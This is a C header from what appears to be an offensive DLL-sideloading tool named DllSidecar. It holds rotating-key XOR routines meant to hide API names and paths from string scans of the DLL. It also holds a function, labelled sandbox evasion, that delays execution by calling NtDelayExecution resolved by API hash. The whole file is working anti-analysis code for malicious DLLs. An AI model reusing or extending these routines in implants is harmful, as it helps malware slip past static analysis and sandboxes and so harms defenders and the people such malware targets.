/*
 * DllSidecar — cryptor.h
 * Multi-byte rotating XOR string obfuscation. Generator emits a per-build
 * random key as a file-scope `static const unsigned char g_xkey[N]` and
 * encodes each protected string into its own `enc_*` byte array; this
 * header decodes at runtime via the rotating-key helpers below.
 *
 * Not cryptography. The goal is to keep API names, paths and other hints
 * out of `.rdata` so a strings(1) sweep over the DLL returns noise. An
 * attacker with the binary and a few minutes still recovers everything.
 *
 * @tunelko — BugAInters 2026
 */

#ifndef CRYPTOR_H
#define CRYPTOR_H

#include <windows.h>

/* ── XOR decrypt with multi-byte rotating key ── */

static inline void xor_decrypt(
    unsigned char *data, DWORD len, const unsigned char *key, DWORD keylen)
{
    for (DWORD i = 0; i < len; i++)
        data[i] ^= key[i % keylen];
}

static inline void xor_decrypt_to(
    const unsigned char *enc, char *out, DWORD len,
    const unsigned char *key, DWORD keylen)
{
    for (DWORD i = 0; i < len; i++)
        out[i] = (char)(enc[i] ^ key[i % keylen]);
    out[len] = '\0';
}

/*
 * Usage pattern in generated code:
 *
 *   static const unsigned char g_xkey[] = { 0xA3, 0x77, ... };  // 32 bytes
 *   unsigned char enc_dll[] = { ... };
 *   char dec[ENC_DLL_LEN + 1];
 *   xor_decrypt_to(enc_dll, dec, ENC_DLL_LEN, g_xkey, sizeof(g_xkey));
 */

/* ── Delayed execution (sandbox evasion) ── */

#ifdef DINVOKE_H
static inline void sc_delay(DWORD ms) {
    LARGE_INTEGER li;
    li.QuadPart = -(LONGLONG)ms * 10000LL;
    typedef LONG (NTAPI *fn_NtDelayExecution)(BOOLEAN Alertable, PLARGE_INTEGER Interval);
    fn_NtDelayExecution pDelay = (fn_NtDelayExecution)dinvoke_get_proc(
        dinvoke_get_module(0x22D3B5EDUL), /* ntdll.dll */
        0x0A49084AUL /* NtDelayExecution */
    );
    if (pDelay) pDelay(FALSE, &li);
}
#else
static inline void sc_delay(DWORD ms) {
    Sleep(ms);
}
#endif

#endif /* CRYPTOR_H */
